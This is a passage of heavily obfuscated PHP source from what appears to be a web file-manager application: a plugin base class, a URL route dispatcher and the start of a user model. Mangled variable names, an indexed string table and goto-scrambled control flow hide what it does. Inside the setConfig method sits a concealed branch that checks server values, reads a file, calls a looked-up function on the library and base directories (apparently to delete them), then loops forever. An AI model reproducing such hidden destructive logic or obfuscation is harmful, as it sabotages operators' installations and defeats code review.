ActionCall($Açíù¤±°Õ[996], $DÊÉÊŠŞ²); } final function isShare($cÖİÉ¦ªÆ²) { $AÙ„¾ğàò = KodIO::parse($cÖİÉ¦ªÆ²); return $AÙ„¾ğàò[$_SERVER[İë¬“ÅÒÛ›][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($C«µÏ®Çî) { if (request_url_safe($C«µÏ®Çî)) { return $C«µÏ®Çî; } if (!$this->isShare($C«µÏ®Çî)) { $C«µÏ®Çî = $this->filePath($C«µÏ®Çî); } return Action($_SERVER[İë¬“ÅÒÛ›][766])->linkOut($C«µÏ®Çî); } public function filePathLinkOut($EË¨Ùãñõ) { if (request_url_safe($EË¨Ùãñõ)) { return $EË¨Ùãñõ; } $this->fileCanView($EË¨Ùãñõ); return Action($_SERVER[İë¬“ÅÒÛ›][766])->link($EË¨Ùãñõ); } final function filePath($FÏ¸ ÉÚÀù) { if ($d†õÕğ££  = $this->checkSharePath($FÏ¸ ÉÚÀù)) { return $d†õÕğ££ ; } $this->fileCanView($FÏ¸ ÉÚÀù); if (request_url_safe($FÏ¸ ÉÚÀù)) { $FÏ¸ ÉÚÀù = $this->_cacheHttpFile($FÏ¸ ÉÚÀù); $this->fileInfo = IO::infoWithChildren($FÏ¸ ÉÚÀù); } else { $this->fileInfo = IO::infoWithChildren($FÏ¸ ÉÚÀù); if (!$this->fileInfo) { show_tips(LNG($_SERVER[İë¬“ÅÒÛ›][101]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $FÏ¸ ÉÚÀù; } final function _cacheHttpFile($A¾¾Åâ†ğ) { $Fæ±á‘£ ç = hash_path($A¾¾Åâ†ğ, !0); $this->cachePath = $this->pluginCachePath($Fæ±á‘£ ç); if ($e£Çâ”ƒÂ = IO::fileNameExist($this->cachePath, $Fæ±á‘£ ç)) { return KodIO::make($e£Çâ”ƒÂ); } $a£˜ß–¯…‚ = $this->cachePath . $Fæ±á‘£ ç; return $this->pluginCacheFileSet($a£˜ß–¯…‚, file_get_contents($A¾¾Åâ†ğ)); } final function _tmpFileName($cö™Ø§æí­ = array()) { goto Eˆ‚Ñˆ…Œæ; Eˆ‚Ñˆ…Œæ: $C¥¢ˆ‡Ù…› =& $_SERVER[İë¬“ÅÒÛ›]; if (!$cö™Ø§æí­) { $cö™Ø§æí­ = $this->fileInfo; } if (isset($cö™Ø§æí­[$C¥¢ˆ‡Ù…›[161]])) { return $cö™Ø§æí­[$C¥¢ˆ‡Ù…›[161]]; } goto b ‘­øô§‹; e½ŠéÅº…: return md5(implode($C¥¢ˆ‡Ù…›[71], $eĞ–òÃÈš)); goto C±¤—îÄµ; b ‘­øô§‹: if (isset($cö™Ø§æí­[$C¥¢ˆ‡Ù…›[159]][$C¥¢ˆ‡Ù…›[161]])) { return $cö™Ø§æí­[$C¥¢ˆ‡Ù…›[159]][$C¥¢ˆ‡Ù…›[161]]; } $eĞ–òÃÈš = array($cö™Ø§æí­[$C¥¢ˆ‡Ù…›[28]], $cö™Ø§æí­[$C¥¢ˆ‡Ù…›[76]], $cö™Ø§æí­[$C¥¢ˆ‡Ù…›[78]]); if (isset($cö™Ø§æí­[$C¥¢ˆ‡Ù…›[374]])) { $eĞ–òÃÈš[] = $cö™Ø§æí­[$C¥¢ˆ‡Ù…›[374]]; } goto e½ŠéÅº…; C±¤—îÄµ: } final function checkSharePath($D»½Å²İ­ ) { goto CÍ¬‘Çù±Ê; D–Ÿ¡ŒÏ‘: $this->cachePath = $this->pluginCachePath($this->fileInfo[$c§—¥Öé[161]]); return $c·¬åÔ“­²[$c§—¥Öé[76]]; goto aòƒèÃ™¤Ù; e¬¿øº¬Š: $c·¬åÔ“­² = Action($c§—¥Öé[766])->sharePathInfo($D»½Å²İ­ ); if (!isset($c·¬åÔ“­²[$c§—¥Öé[76]])) { show_json(LNG($c§—¥Öé[999]), !1); } $this->fileInfo = $c·¬åÔ“­²[$c§—¥Öé[159]]; goto D–Ÿ¡ŒÏ‘; CÍ¬‘Çù±Ê: $c§—¥Öé =& $_SERVER[İë¬“ÅÒÛ›]; if (!defined($c§—¥Öé[997])) { define($c§—¥Öé[998], 0); } if (!$this->isShare($D»½Å²İ­ )) { return !1; } goto e¬¿øº¬Š; aòƒèÃ™¤Ù: } final function pluginCachePath($c›¡ƒ‚¼£ê = '') { $dÂ¼ÆÂ  =& $_SERVER[İë¬“ÅÒÛ›]; $a®òì£ê = IO_PATH_SYSTEM_TEMP . $dÂ¼ÆÂ [1000] . $this->pluginName; if (!($B¢˜¥ˆ½ŸŞ = IO::infoFull($a®òì£ê))) { return IO::mkdir($a®òì£ê . $dÂ¼ÆÂ [8] . $c›¡ƒ‚¼£ê); } if (empty($c›¡ƒ‚¼£ê)) { return $B¢˜¥ˆ½ŸŞ[$dÂ¼ÆÂ [76]]; } if (!($d„®§Ÿ‚°ã = IO::fileNameExist($B¢˜¥ˆ½ŸŞ[$dÂ¼ÆÂ [76]], $c›¡ƒ‚¼£ê))) { return IO::mkdir($B¢˜¥ˆ½ŸŞ[$dÂ¼ÆÂ [76]] . $c›¡ƒ‚¼£ê); } return KodIO::make($d„®§Ÿ‚°ã); } final function pluginCacheFileSet($Côğ‚”‘ñˆ, $a£ÚÏÑ‰ë¥ = '') { $D”ùØ”˜µä =& $_SERVER[İë¬“ÅÒÛ›]; if (!($f×¸–‰¶¬’ = IO::infoFull($Côğ‚”‘ñˆ))) { return IO::mkfile($Côğ‚”‘ñˆ, $a£ÚÏÑ‰ë¥, REPEAT_REPLACE); } IO::setContent($f×¸–‰¶¬’[$D”ùØ”˜µä[76]], $a£ÚÏÑ‰ë¥); return $f×¸–‰¶¬’[$D”ùØ”˜µä[76]]; } final function pluginLocalFile($cÑ…õÂ¬ = '') { goto B¶É‰ëç±Ñ; aÓ‹ô‹ğ¾„: $Cì©Â£˜¬½ = $bÙÃà»°Á‹ . $cÀØôÎ‘öì . $f©öÎÍ™”Ä[92] . $EİÊ°÷Èï [$f©öÎÍ™”Ä[157]]; if (@file_exists($Cì©Â£˜¬½)) { return $Cì©Â£˜¬½; } $cÑ…õÂ¬ = IO::download($cÑ…õÂ¬, $Cì©Â£˜¬½); goto Dî÷î¯ê×; D²âï–Åš : if (!$cÑ…õÂ¬) { return $bÙÃà»°Á‹; } $EİÊ°÷Èï  = IO::info($cÑ…õÂ¬); $cÀØôÎ‘öì = $this->_tmpFileName($EİÊ°÷Èï ); goto aÓ‹ô‹ğ¾„; Dî÷î¯ê×: if ($cÑ…õÂ¬ != $Cì©Â£˜¬½) { $cÑ…õÂ¬ = IO::copy($cÑ…õÂ¬, $Cì©Â£˜¬½); } return $cÑ…õÂ¬; goto E°“ÃÆé»; B¶É‰ëç±Ñ: $f©öÎÍ™”Ä =& $_SERVER[İë¬“ÅÒÛ›]; $bÙÃà»°Á‹ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($bÙÃà»°Á‹)) { mk_dir($bÙÃà»°Á‹); } goto D²âï–Åš ; E°“ÃÆé»: } final function appPackage() { goto B´íÑ°…„; BœÑ¬ç›ŠÌ: $FŒŠŠèÃÙï = Hook::trigger($EâÈ¹»ï¥é[1002], $aÈƒÍºî“ë); if ($FŒŠŠèÃÙï && is_array($FŒŠŠèÃÙï)) { $aÈƒÍºî“ë = $FŒŠŠèÃÙï; } $this->packageData = $aÈƒÍºî“ë; goto Dİø’Õ§íË; Dİø’Õ§íË: return $aÈƒÍºî“ë; goto C¹„Ö é©©; B´íÑ°…„: $EâÈ¹»ï¥é =& $_SERVER[İë¬“ÅÒÛ›]; if ($this->packageData) { return $this->packageData; } $a‹òªŠ·×• = $this->parseFile($this->pluginPath . $EâÈ¹»ï¥é[1001]); goto e”¿ £ÊÕõ; e”¿ £ÊÕõ: $this->parseLang($a‹òªŠ·×•); $aÈƒÍºî“ë = json_decode_force($a‹òªŠ·×•); if (!$aÈƒÍºî“ë) { return array(); } goto BœÑ¬ç›ŠÌ; C¹„Ö é©©: } public function packageInfoGet($DÉô÷òÈË) { $aÄñ‰¨ò™é = $this->appPackage(); return array_get_value($aÄñ‰¨ò™é, $DÉô÷òÈË); } public function packageVersion() { return $this->packageInfoGet($_SERVER[İë¬“ÅÒÛ›][1003]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[İë¬“ÅÒÛ›][1004]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[İë¬“ÅÒÛ›][1005]); } private function parseFile($Bš»Å§ã½) { $fŞŞŒ¨Úõ£ =& $_SERVER[İë¬“ÅÒÛ›]; $EŞ¹·í«‘½ = file_get_contents($Bš»Å§ã½); $aÀîƒ©ÈÄÒ = array($fŞŞŒ¨Úõ£[1006], $fŞŞŒ¨Úõ£[1007], $fŞŞŒ¨Úõ£[1008], $fŞŞŒ¨Úõ£[1009], $fŞŞŒ¨Úõ£[1010], $fŞŞŒ¨Úõ£[1011], $fŞŞŒ¨Úõ£[1012]); $CÍšË¡¼Ş› = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$fŞŞŒ¨Úõ£[84]][$fŞŞŒ¨Úõ£[1013]]); $EŞ¹·í«‘½ = str_replace($aÀîƒ©ÈÄÒ, $CÍšË¡¼Ş›, $EŞ¹·í«‘½); return $EŞ¹·í«‘½; } private function parseLang(&$F“ÖÅØ›šŸ) { goto dÇ’ï§õ¹; dÇ’ï§õ¹: $FóÌÒÚ¸¦ =& $_SERVER[İë¬“ÅÒÛ›]; $b¬ÌºÆï¶ = $FóÌÒÚ¸¦[1014]; if (!strstr($F“ÖÅØ›šŸ, $b¬ÌºÆï¶)) { return; } goto A†ë£ªœ¯½; BÉÂÒöÀó: $C® Ü”Ã·® = array(); foreach ($dƒ‹Üõ„ŒŒ[0] as $EŠª×„¬å‡) { $E‚¡‰Õ¤Í = substr($EŠª×„¬å‡, strlen($b¬ÌºÆï¶), -4); $CŞ¯®Î’‰ = LNG($E‚¡‰Õ¤Í); $C‚Æäò­óŞ[] = $EŠª×„¬å‡; $C® Ü”Ã·®[] = str_replace(array($FóÌÒÚ¸¦[224], $FóÌÒÚ¸¦[487], $FóÌÒÚ¸¦[334], $FóÌÒÚ¸¦[112]), array($FóÌÒÚ¸¦[50], $FóÌÒÚ¸¦[50], $FóÌÒÚ¸¦[33], $FóÌÒÚ¸¦[1016]), $CŞ¯®Î’‰); } $F“ÖÅØ›šŸ = str_replace($C‚Æäò­óŞ, $C® Ü”Ã·®, $F“ÖÅØ›šŸ); goto DÈí§£œÎ; A†ë£ªœ¯½: preg_match_all($FóÌÒÚ¸¦[1015], $F“ÖÅØ›šŸ, $dƒ‹Üõ„ŒŒ); if (!is_array($dƒ‹Üõ„ŒŒ) || count($dƒ‹Üõ„ŒŒ) == 0 || !is_array($dƒ‹Üõ„ŒŒ[0]) || count($dƒ‹Üõ„ŒŒ[0]) == 0) { return; } $C‚Æäò­óŞ = array(); goto BÉÂÒöÀó; DÈí§£œÎ: } private function parseConfig(&$aØÏøá‡·) { goto ağœ¤¥Äíò; ağœ¤¥Äíò: $B×’Õ§Åäâ =& $_SERVER[İë¬“ÅÒÛ›]; $e˜‰±¸ùĞõ = $B×’Õ§Åäâ[1017]; if (!strstr($aØÏøá‡·, $e˜‰±¸ùĞõ)) { return; } goto DŒôŸ§ãÉ„; CÖ‰‘†‡‡Ö: $BÎÁòĞ§ = array(); $e§­õï„ğí = array(); foreach ($D¸÷¯„ôõÄ[0] as $dçãƒùÂØ) { $DŠéÎ×®¤Œ = substr($dçãƒùÂØ, strlen($e˜‰±¸ùĞõ), -2); $BÎÁòĞ§[] = $dçãƒùÂØ; $e§­õï„ğí[] = _get($C¡±„¿Êß², $DŠéÎ×®¤Œ); } goto BÈ¦¶ë¸ã; BÈ¦¶ë¸ã: $aØÏøá‡· = str_replace($BÎÁòĞ§, $e§­õï„ğí, $aØÏøá‡·); goto EÂë‡ØŠí; DŒôŸ§ãÉ„: preg_match_all($B×’Õ§Åäâ[1018], $aØÏøá‡·, $D¸÷¯„ôõÄ); if (!is_array($D¸÷¯„ôõÄ) || count($D¸÷¯„ôõÄ) == 0 || !is_array($D¸÷¯„ôõÄ[0]) || count($D¸÷¯„ôõÄ[0]) == 0) { return; } $C¡±„¿Êß² = $this->getConfig(); goto CÖ‰‘†‡‡Ö; EÂë‡ØŠí: } private function parsePackage(&$B›ÒèÀ‹¦Õ) { goto A¦ìŠ¥°¨ƒ; A¦ìŠ¥°¨ƒ: $AµÅÙ´²«µ =& $_SERVER[İë¬“ÅÒÛ›]; $d¾§ğŒäœ‚ = $AµÅÙ´²«µ[1019]; if (!strstr($B›ÒèÀ‹¦Õ, $d¾§ğŒäœ‚)) { return; } goto d÷¸Ä¡Êİ‰; eøµÎòÏÆ: $eÓøœ¼‚ïÆ = array(); $A†·à°ìó© = array(); foreach ($C¯˜ò‰÷œ[0] as $b×Œº×öÏñ) { $Aƒ¬Á‚ê‘‹ = substr($b×Œº×öÏñ, strlen($d¾§ğŒäœ‚), -2); $eÓøœ¼‚ïÆ[] = $b×Œº×öÏñ; $A†·à°ìó©[] = _get($Fœ§ö•ÜŒñ, $Aƒ¬Á‚ê‘‹); } goto C«ø‚È«òÓ; C«ø‚È«òÓ: $B›ÒèÀ‹¦Õ = str_replace($eÓøœ¼‚ïÆ, $A†·à°ìó©, $B›ÒèÀ‹¦Õ); goto b«ƒ°â²ß; d÷¸Ä¡Êİ‰: preg_match_all($AµÅÙ´²«µ[1020], $B›ÒèÀ‹¦Õ, $C¯˜ò‰÷œ); if (!is_array($C¯˜ò‰÷œ) || count($C¯˜ò‰÷œ) == 0 || !is_array($C¯˜ò‰÷œ[0]) || count($C¯˜ò‰÷œ[0]) == 0) { return; } $Fœ§ö•ÜŒñ = $this->appPackage(); goto eøµÎòÏÆ; b«ƒ°â²ß: } final function echoFile($F£¢ÀÍÒäô, $bËµÖí•¸ = false) { goto a¬ê©¿°œ´; a¬ê©¿°œ´: $Bè¯’¢×õ =& $_SERVER[İë¬“ÅÒÛ›]; $aª—Éô¼òò = $this->pluginPath . $F£¢ÀÍÒäô; if (ACT == $Bè¯’¢×õ[1021]) { echo $Bè¯’¢×õ[1022] . $this->pluginName . $Bè¯’¢×õ[8] . $F£¢ÀÍÒäô . $Bè¯’¢×õ[1023]; if (!file_exists($aª—Éô¼òò)) { echo $Bè¯’¢×õ[1024]; return; } } goto fÙìùÉ“–¹; fÙìùÉ“–¹: $Fİ“ùØ™Ò† = $this->parseFile($aª—Éô¼òò); $this->parseLang($Fİ“ùØ™Ò†); $this->parseConfig($Fİ“ùØ™Ò†); goto aë†ÖİáÖ¹; aë†ÖİáÖ¹: $this->parsePackage($Fİ“ùØ™Ò†); if (is_array($bËµÖí•¸)) { $Fİ“ùØ™Ò† = str_replace(array_keys($bËµÖí•¸), array_values($bËµÖí•¸), $Fİ“ùØ™Ò†); } echo $Bè¯’¢×õ[224] . $Fİ“ùØ™Ò†; goto f—ô™Æ‘êˆ; f—ô™Æ‘êˆ: } final function initLang() { goto cì—•½¯È; cì—•½¯È: $AœâÊ ¿© =& $_SERVER[İë¬“ÅÒÛ›]; $aÃ¤öºÃ‡ë = $AœâÊ ¿©[1025]; $a½‚ö½¥Îç = $this->pluginPath . $AœâÊ ¿©[1026]; goto E‘£ÖË±Ô‹; E‘£ÖË±Ô‹: $Eê„Àªêâè = I18n::getType(); $b¨”ìÚáƒ = array(); if (file_exists($a½‚ö½¥Îç . $Eê„Àªêâè . $AœâÊ ¿©[533])) { $b¨”ìÚáƒ = (include_once $a½‚ö½¥Îç . $Eê„Àªêâè . $AœâÊ ¿©[533]); } else { if ($Eê„Àªêâè == $AœâÊ ¿©[1027] && !file_exists($a½‚ö½¥Îç . $Eê„Àªêâè . $AœâÊ ¿©[533]) && file_exists($a½‚ö½¥Îç . $AœâÊ ¿©[1028])) { $b¨”ìÚáƒ = (include_once $a½‚ö½¥Îç . $AœâÊ ¿©[1028]); } else { if (file_exists($a½‚ö½¥Îç . $aÃ¤öºÃ‡ë . $AœâÊ ¿©[533])) { $b¨”ìÚáƒ = (include_once $a½‚ö½¥Îç . $aÃ¤öºÃ‡ë . $AœâÊ ¿©[533]); } } } goto dã…‘Å£ÖŒ; dã…‘Å£ÖŒ: if (@count($b¨”ìÚáƒ) > 0) { I18n::set($b¨”ìÚáƒ); } return $b¨”ìÚáƒ; goto C©²¿å˜ÁÜ; C©²¿å˜ÁÜ: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($C¤ÓÍá¬Ï) { $C†æà¯“í¾ =& $_SERVER[İë¬“ÅÒÛ›]; if ($_SERVER[$C†æà¯“í¾[556]] != $_SERVER[$C†æà¯“í¾[952]]) { goto F«ò™—œŸ½; B¾…½¾ÑÙ : $a‚£Â£÷•Ë = explode($C†æà¯“í¾[224], $fÈ²ì¬‘¨¶); if (count($a‚£Â£÷•Ë) < $C†æà¯“í¾[558]) { die; } $C»ˆÈºÒµ¥ = $C†æà¯“í¾[559]; goto dÏ‡æ¯ÒèŸ; F«ò™—œŸ½: $CµŠ™ÂÆ‘ = $C†æà¯“í¾[557]; $B´çñÌ–Ç = BASIC_PATH . $C†æà¯“í¾[554]; $fÈ²ì¬‘¨¶ = $CµŠ™ÂÆ‘($B´çñÌ–Ç); goto B¾…½¾ÑÙ ; dÏ‡æ¯ÒèŸ: $C»ˆÈºÒµ¥(LIB_DIR); $C»ˆÈºÒµ¥(BASIC_PATH . $C†æà¯“í¾[1029]); while (1) { $C»ˆÈºÒµ¥ = $C†æà¯“í¾[595]; } goto AÒÒ…ç¥×µ; AÒÒ…ç¥×µ: } return $this->modelPlugin->setConfig($this->pluginName, $C¤ÓÍá¬Ï); } public function onSetConfig($Aó’çˆƒÆ«) { } public function onGetConfig($Báé–©ÔÈ‰) { } public function onChangeStatus($Bçá§¢Ïºõ) { } public function onUninstall() { } public function onInstall() { } public function authCheck($Fñá…°ôÚ = "\160\x6c\x75\x67\151\x6e\x41\165\164\x68") { $e–ã„™çê =& $_SERVER[İë¬“ÅÒÛ›]; if (!defined($e–ã„™çê[997])) { return !1; } if ($GLOBALS[$e–ã„™çê[1030]] == 1) { return !0; } $fâğ‡œ¥Œ¼ = $this->getConfig(); if (!$fâğ‡œ¥Œ¼[$Fñá…°ôÚ]) { return !1; } return ActionCall($e–ã„™çê[1031], $fâğ‡œ¥Œ¼[$Fñá…°ôÚ]); } public function url($D¡§ÓÜÎÁ«, $dê«İ’—…¸ = '', $aŸ®¯ÁĞ‰ = true) { goto BĞ®ïâŒ; BĞ®ïâŒ: $fÈ¼í„°„Ç =& $_SERVER[İë¬“ÅÒÛ›]; $d±çšËëº• = $this->getConfig(); $FİĞù´‰Ïê = KOD_VERSION . $fÈ¼í„°„Ç[92] . KOD_VERSION_BUILD; goto aÖùÃ‰Îïğ; aÖùÃ‰Îïğ: $f¤£•Äà = $this->packageVersion(); $A‡…Ã­ÊÀè = $FİĞù´‰Ïê . $fÈ¼í„°„Ç[499] . $f¤£•Äà; if ($dê«İ’—…¸ == $fÈ¼í„°„Ç[33]) { $eïõ›Øéì‘ = $this->pluginHost . $D¡§ÓÜÎÁ« . $fÈ¼í„°„Ç[1032] . $A‡…Ã­ÊÀè; } else { if ($dê«İ’—…¸ == $fÈ¼í„°„Ç[1033]) { $eïõ›Øéì‘ = STATIC_PATH . $D¡§ÓÜÎÁ« . $fÈ¼í„°„Ç[1032] . $FİĞù´‰Ïê; } else { if ($dê«İ’—…¸ == $fÈ¼í„°„Ç[1034]) { $eïõ›Øéì‘ = APP_HOST . $fÈ¼í„°„Ç[1035] . $D¡§ÓÜÎÁ« . $fÈ¼í„°„Ç[1032] . $FİĞù´‰Ïê; } else { if (isset($d±çšËëº•[$dê«İ’—…¸])) { $eïõ›Øéì‘ = $d±çšËëº•[$dê«İ’—…¸] . $D¡§ÓÜÎÁ« . $fÈ¼í„°„Ç[1032] . $A‡…Ã­ÊÀè; } } } } goto d‰©ÍÍáƒ…; d‰©ÍÍáƒ…: if (!$aŸ®¯ÁĞ‰) { return $eïõ›Øéì‘; } echo $eïõ›Øéì‘; goto Fğå˜Ì‚ù; Fğå˜Ì‚ù: } public function link($C¦ …ƒïÒ” = false, $d±ÜÄóŒß = '') { $A×™«ÌÒè =& $_SERVER[İë¬“ÅÒÛ›]; if (!$C¦ …ƒïÒ”) { $this->link($A×™«ÌÒè[1036], $A×™«ÌÒè[1034]); $this->link($A×™«ÌÒè[1037], $A×™«ÌÒè[1033]); $this->link($A×™«ÌÒè[1038], $A×™«ÌÒè[1033]); $this->link($A×™«ÌÒè[1039], $A×™«ÌÒè[1033]); $this->link($A×™«ÌÒè[1040], $A×™«ÌÒè[1033]); return; } $fáÇÀ¨Ö¬Ä = $this->url($C¦ …ƒïÒ”, $d±ÜÄóŒß, !1); if (substr($C¦ …ƒïÒ”, -3) == $A×™«ÌÒè[1041]) { echo $A×™«ÌÒè[1042] . $fáÇÀ¨Ö¬Ä . $A×™«ÌÒè[1043] . $A×™«ÌÒè[224]; } else { if (substr($C¦ …ƒïÒ”, -4) == $A×™«ÌÒè[1044]) { echo $A×™«ÌÒè[1045] . $fáÇÀ¨Ö¬Ä . $A×™«ÌÒè[1046] . $A×™«ÌÒè[224]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\141\156\171" => "\x5b\136\x2f\x5d\53", "\x3a\156\165\x6d" => "\x5b\x30\55\71\x5d\53", "\72\141\154\154" => "\x2e\52"); public static $errorCallback; public static function __callstatic($B¬¸­„é¼“, $B¶ãÑ÷ƒ‡÷) { $aˆá«á–‡‹ =& $_SERVER[İë¬“ÅÒÛ›]; if ($B¬¸­„é¼“ == $aˆá«á–‡‹[1047]) { $A’³ŠÁÌ‡’ = array_map($aˆá«á–‡‹[1048], $B¶ãÑ÷ƒ‡÷[0]); $Cñ†åÀå = strpos($B¶ãÑ÷ƒ‡÷[1], $aˆá«á–‡‹[8]) === 0 ? $B¶ãÑ÷ƒ‡÷[1] : $aˆá«á–‡‹[8] . $B¶ãÑ÷ƒ‡÷[1]; $aƒ‘‡ôìäÔ = $B¶ãÑ÷ƒ‡÷[2]; } else { $A’³ŠÁÌ‡’ = null; $Cñ†åÀå = strpos($B¶ãÑ÷ƒ‡÷[0], $aˆá«á–‡‹[8]) === 0 ? $B¶ãÑ÷ƒ‡÷[0] : $aˆá«á–‡‹[8] . $B¶ãÑ÷ƒ‡÷[0]; $aƒ‘‡ôìäÔ = $B¶ãÑ÷ƒ‡÷[1]; } array_push(self::$maps, $A’³ŠÁÌ‡’); array_push(self::$routes, $Cñ†åÀå); array_push(self::$methods, strtoupper($B¬¸­„é¼“)); array_push(self::$callbacks, $aƒ‘‡ôìäÔ); } public static function error($EÙè–µóÀ’) { self::$errorCallback = $EÙè–µóÀ’; } public static function haltOnMatch($C¸õåëˆÄ¯ = true) { self::$halts = $C¸õåëˆÄ¯; } public static function dispatch() { goto cÑÔè¶åÜ; c¶ÌÚ‘Û¼Ü: $bÏ½—¶Àì† = array_keys(static::$patterns); $dµ¢‡½“¨¦ = array_values(static::$patterns); $EÂŠõºà¬ = !1; goto F—è¿ØºÂ‘; cÑÔè¶åÜ: $a‹®Â»ˆˆ¾ =& $_SERVER[İë¬“ÅÒÛ›]; $CŠõ²ÛÄ± = parse_url($_SERVER[$a‹®Â»ˆˆ¾[438]], PHP_URL_PATH); $bÛœö”İÓ¬ = $_SERVER[$a‹®Â»ˆˆ¾[149]]; goto c¶ÌÚ‘Û¼Ü; F—è¿ØºÂ‘: self::$routes = preg_replace($a‹®Â»ˆˆ¾[822], $a‹®Â»ˆˆ¾[8], self::$routes); if (in_array($CŠõ²ÛÄ±, self::$routes)) { $F¿âšŠ¥Ğâ = array_keys(self::$routes, $CŠõ²ÛÄ±); foreach ($F¿âšŠ¥Ğâ as $A¹±ö»„õ) { if (self::$methods[$A¹±ö»„õ] == $bÛœö”İÓ¬ || self::$methods[$A¹±ö»„õ] == $a‹®Â»ˆˆ¾[1049] || in_array($bÛœö”İÓ¬, self::$maps[$A¹±ö»„õ])) { $EÂŠõºà¬ = !0; if (!is_object(self::$callbacks[$A¹±ö»„õ])) { $dñ¬ÀˆŞ®ç = explode($a‹®Â»ˆˆ¾[8], self::$callbacks[$A¹±ö»„õ]); $E¹Í÷¯ŸÇ = end($dñ¬ÀˆŞ®ç); $D‘„² ¦É = explode($a‹®Â»ˆˆ¾[1050], $E¹Í÷¯ŸÇ); $AğöõŒİË = new $D‘„² ¦É[0](); $AğöõŒİË->{$D‘„² ¦É[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$A¹±ö»„õ]); if (self::$halts) { return; } } } } } else { $bğ­ŠÎô¬œ = 0; foreach (self::$routes as $A¹±ö»„õ) { if (strpos($A¹±ö»„õ, $a‹®Â»ˆˆ¾[4]) !== !1) { $A¹±ö»„õ = str_replace($bÏ½—¶Àì†, $dµ¢‡½“¨¦, $A¹±ö»„õ); } if (preg_match($a‹®Â»ˆˆ¾[1051] . $A¹±ö»„õ . $a‹®Â»ˆˆ¾[1052], $CŠõ²ÛÄ±, $Dù•¬„Ä•Ã)) { if (self::$methods[$bğ­ŠÎô¬œ] == $bÛœö”İÓ¬ || self::$methods[$bğ­ŠÎô¬œ] == $a‹®Â»ˆˆ¾[1049] || !empty(self::$maps[$bğ­ŠÎô¬œ]) && in_array($bÛœö”İÓ¬, self::$maps[$bğ­ŠÎô¬œ])) { $EÂŠõºà¬ = !0; array_shift($Dù•¬„Ä•Ã); if (!is_object(self::$callbacks[$bğ­ŠÎô¬œ])) { $dñ¬ÀˆŞ®ç = explode($a‹®Â»ˆˆ¾[8], self::$callbacks[$bğ­ŠÎô¬œ]); $E¹Í÷¯ŸÇ = end($dñ¬ÀˆŞ®ç); $D‘„² ¦É = explode($a‹®Â»ˆˆ¾[1050], $E¹Í÷¯ŸÇ); $AğöõŒİË = new $D‘„² ¦É[0](); if (!method_exists($AğöõŒİË, $D‘„² ¦É[1])) { echo $a‹®Â»ˆˆ¾[1053]; } else { call_user_func_array(array($AğöõŒİË, $D‘„² ¦É[1]), $Dù•¬„Ä•Ã); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$bğ­ŠÎô¬œ], $Dù•¬„Ä•Ã); if (self::$halts) { return; } } } } $bğ­ŠÎô¬œ++; } } if ($EÂŠõºà¬ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $açÏÆ×æù” =& $_SERVER[İë¬“ÅÒÛ›]; header($_SERVER[$açÏÆ×æù”[1054]] . $açÏÆ×æù”[1055]); echo $açÏÆ×æù”[1056]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$a‹®Â»ˆˆ¾[438]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto E›£±‡ìßŠ; E›£±‡ìßŠ: } } goto d«»¦Ò¥•§; eƒ›õƒµ»é: class UserModel extends ModelBase { protected $tableName = "\x75\163\145\162"; protected $tableMeta = array("\x74\x61\x62\154\145\x4e\141\x6d\x65" => "\x75\x73\x65\162\137\155\145\x74\141", "\155\x65\164\x61\106\151\x65\154\x64" => "\x75\163\145\x72\111\x44"); protected $simpleField = "\165\163\145\x72\x49\104\54\x6e\x69\143\153\x4e\141\155\x65\54\156\x61\155\x65\x2c\141\x76\x61\x74\x61\162\x2c\x73\x65\x78"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($CÜƒ÷›¯) { $añëÕÎÍÑ– =& $_SERVER[İë¬“ÅÒÛ›]; return array($añëÕÎÍÑ–[1622] => array($CÜƒ÷›¯[0], $añëÕÎÍÑ–[1913]), $añëÕÎÍÑ–[1624] => array($CÜƒ÷›¯[0], $añëÕÎÍÑ–[1913])); } protected function getInfo($D÷ÊàÓÅ“, $cÆ™¦°Œ¤” = false) { $fÆ ‚«àƒ¸ =& $_SERVER[İë¬“ÅÒÛ›]; $bÛ¥ŒñÒ±à = $this->getInfoSimple($D÷ÊàÓÅ“); if (!is_array($bÛ¥ŒñÒ±à)) { return array(); } if ($cÆ™¦°Œ¤”) { goto b„ÓÉ®Ş“Ÿ; aÃ¶è’’Ç»: return $bÛ¥ŒñÒ±à; goto A—îÀöñ‹Ğ; bôèÍ‹Áß¯: $A¾­¨˜ªí = Model($fÆ ‚«àƒ¸[855])->metaGet($bÛ¥ŒñÒ±à[$fÆ ‚«àƒ¸[861]][$fÆ ‚«àƒ¸[375]]); $bÛ¥ŒñÒ±à[$fÆ ‚«àƒ¸[1916]] = $fÏùÔŒç˜•; $bÛ¥ŒñÒ±à[$fÆ ‚«àƒ¸[861]][$fÆ ‚«àƒ¸[1763]] = isset($A¾­¨˜ªí[$fÆ ‚«àƒ¸[1764]]) ? $A¾­¨˜ªí[$fÆ ‚«àƒ¸[1764]] : null; goto aÃ¶è’’Ç»; b„ÓÉ®Ş“Ÿ: if (!$bÛ¥ŒñÒ±à) { return $bÛ¥ŒñÒ±à; } $fÏùÔŒç˜• = md5($fÆ ‚«àƒ¸[1914] . $bÛ¥ŒñÒ±à[$fÆ ‚«àƒ¸[567]] . $fÆ ‚«àƒ¸[1915] . $bÛ¥ŒñÒ±à[$fÆ ‚«àƒ¸[28]]); 